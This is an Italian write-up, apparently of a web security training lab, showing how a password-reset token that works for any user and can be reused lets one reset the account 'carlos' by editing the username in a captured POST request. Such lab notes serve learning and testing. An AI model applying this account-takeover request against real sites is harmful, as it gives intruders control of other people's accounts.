very easy.

La richiesta di reset password genera un token che è valido **per qualsiasi utente**.

Inoltre, il token **può essere utlizzato più volte**

`POST /forgot-password?temp-forgot-password-token=1f0ui913712nv0z30pr70x73xws2z9go HTTP/2`

`temp-forgot-password-token=1f0ui913712nv0z30pr70x73xws2z9go&username=wiener&new-password-1=password&new-password-2=password`


![](_attachment/Pasted%20image%2020250328200606.png)

Dunque, basta triggerare la generazione del token e modificare la richiesta, sostituendo `wiener` con `carlos`.

La password di `carlos` sarà dunque modificata in "`password`" e sarà possibile accedere e risolvere il lab.

